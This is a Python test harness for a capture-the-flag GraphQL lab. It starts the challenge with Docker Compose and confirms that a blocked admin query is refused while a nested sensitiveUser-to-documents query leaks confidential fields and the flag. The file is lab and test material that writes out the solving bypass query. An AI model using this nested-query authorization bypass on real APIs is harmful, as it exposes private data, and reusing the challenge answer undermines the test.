#!/usr/bin/env python3
"""
Nested Query Bypass Challenge Tests
Tests for nested query bypass vulnerability in GraphQL
"""

import requests
import json
import sys
import time
import subprocess
import os
from urllib.parse import urljoin


class TestNestedQueryBypassChallenge:
    """Test suite for Nested Query Bypass Challenge"""
    
    def __init__(self, base_url="http://localhost:8005"):
        self.base_url = base_url
        self.graphql_url = urljoin(base_url, "/graphql")
        self.health_url = urljoin(base_url, "/health")
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Nested-Query-Bypass-Test/1.0'
        })
        self.tests_passed = 0
        self.tests_failed = 0
    
    def start_services(self):
        """Start Docker Compose services"""
        print("🚀 Starting Nested Query Bypass Challenge...")
        try:
            # Change to challenge directory
            os.chdir('../05-nested-query-bypass')
            subprocess.run(['docker-compose', '-f', 'docker-compose-dev.yml', 'up', '-d'], 
                         check=True, capture_output=True)
            return True
        except subprocess.CalledProcessError as e:
            print(f"❌ Failed to start services: {e}")
            return False
        finally:
            # Change back to tests directory
            os.chdir('../tests')
    
    def stop_services(self):
        """Stop Docker Compose services"""
        print("🧹 Cleaning up...")
        try:
            # Change to challenge directory
            os.chdir('../05-nested-query-bypass')
            subprocess.run(['docker-compose', '-f', 'docker-compose-dev.yml', 'down'], 
                         check=True, capture_output=True)
        except subprocess.CalledProcessError as e:
            print(f"⚠️ Warning: Failed to stop services: {e}")
        finally:
            # Change back to tests directory
            os.chdir('../tests')
    
    def wait_for_service(self, timeout=120):
        """Wait for the service to be ready"""
        print("⏳ Waiting for services to be ready...")
        start_time = time.time()
        while time.time() - start_time < timeout:
            try:
                response = self.session.get(self.health_url)
                if response.status_code == 200:  # Health endpoint returns 200
                    print("✅ Services are ready")
                    return True
            except requests.exceptions.RequestException:
                pass
            time.sleep(2)
        
        print(f"❌ Services failed to start within {timeout}s")
        return False
    
    def graphql_query(self, query, variables=None):
        """Execute a GraphQL query"""
        payload = {"query": query}
        if variables:
            payload["variables"] = variables
        
        response = self.session.post(self.graphql_url, json=payload)
        return response
    
    def test_basic_query_functionality(self):
        """Test that basic queries work normally"""
        print("🧪 Test: Basic query functionality")
        
        try:
            # Test basic single query functionality
            query = "{ users { id username } }"
            
            response = self.session.post(self.graphql_url, json={"query": query})
            
            # Check if query succeeds
            if response.status_code == 200:
                data = response.json()
                if data.get('data') is not None and 'users' in data['data']:
                    print("✅ PASS - Basic queries working correctly")
                    self.tests_passed += 1
                    return True
                    
            print("❌ FAIL - Basic query functionality failed")
            print(f"Response: {response.text}")
            self.tests_failed += 1
            return False
                
        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False
    
    def test_nested_query_access(self):
        """Test flag access via nested sensitiveUser query"""
        print("🧪 Test: Flag access via nested sensitiveUser query")
        
        try:
            # Test nested query to get flag via sensitiveUser -> documents
            query = '{ sensitiveUser(id: 3) { id username documents { id title confidential debugInfo } } }'
            
            response = self.session.post(self.graphql_url, json={"query": query})
            
            # Check if we can access confidential data and find flag
            if (response.status_code == 200 and 
                'HC{' in response.text):
                print("✅ PASS - Flag access successful via nested query (flag found)")
                self.tests_passed += 1
                return True
            else:
                print("❌ FAIL - Flag access failed or flag not found")
                print(f"Response: {response.text}")
                self.tests_failed += 1
                return False
                
        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False
    
    def test_admin_endpoint_forbidden(self):
        """Test that adminDocuments endpoint is always forbidden"""
        print("🧪 Test: AdminDocuments endpoint forbidden")
        
        try:
            # Test admin query - should always be forbidden
            query = '{ adminDocuments { id title confidential debugInfo } }'
            
            response = self.session.post(self.graphql_url, json={"query": query})
            
            # Check that access is forbidden
            if (response.status_code == 200 and 
                'Access to adminDocuments is forbidden' in response.text):
                print("✅ PASS - AdminDocuments endpoint properly forbidden")
                self.tests_passed += 1
                return True
            else:
                print("❌ FAIL - AdminDocuments endpoint not properly forbidden")
                print(f"Response: {response.text}")
                self.tests_failed += 1
                return False
                
        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False

    def test_sensitive_user_access(self):
        """Test that sensitiveUser endpoint is accessible"""
        print("🧪 Test: SensitiveUser endpoint access")
        
        try:
            # Test sensitiveUser query - should be accessible
            query = '{ sensitiveUser(id: 1) { id username } }'
            
            response = self.session.post(self.graphql_url, json={"query": query})
            
            # Check that access works
            if (response.status_code == 200 and 
                response.json().get('data') is not None):
                print("✅ PASS - SensitiveUser endpoint accessible")
                self.tests_passed += 1
                return True
            else:
                print("❌ FAIL - SensitiveUser endpoint not accessible")
                print(f"Response: {response.text}")
                self.tests_failed += 1
                return False
                
        except Exception as e:
            print(f"❌ FAIL - Exception occurred: {e}")
            self.tests_failed += 1
            return False
    
    def run_tests(self):
        """Run all nested query bypass tests"""
        print("🔍 Nested Query Bypass Challenge Test Runner")
        print("============================================")
        
        if not self.start_services():
            return False
        
        try:
            if not self.wait_for_service():
                return False
            
            print("\n🧪 Running nested query bypass tests...\n")
            
            # Run tests
            self.test_basic_query_functionality()
            self.test_admin_endpoint_forbidden()
            self.test_sensitive_user_access()
            self.test_nested_query_access()
            
            print(f"\n📊 Test Results: {self.tests_passed} passed, {self.tests_failed} failed")
            
            if self.tests_failed > 0:
                print("❌ Some tests failed")
                return False
            else:
                print("✅ All tests passed!")
                return True
                
        finally:
            self.stop_services()


def main():
    """Main function"""
    tester = TestNestedQueryBypassChallenge()
    success = tester.run_tests()
    
    if success:
        print("\n🎉 Nested Query Bypass Challenge tests completed successfully!")
        sys.exit(0)
    else:
        print("\n❌ Nested Query Bypass Challenge tests failed!")
        sys.exit(1)


if __name__ == "__main__":
    main()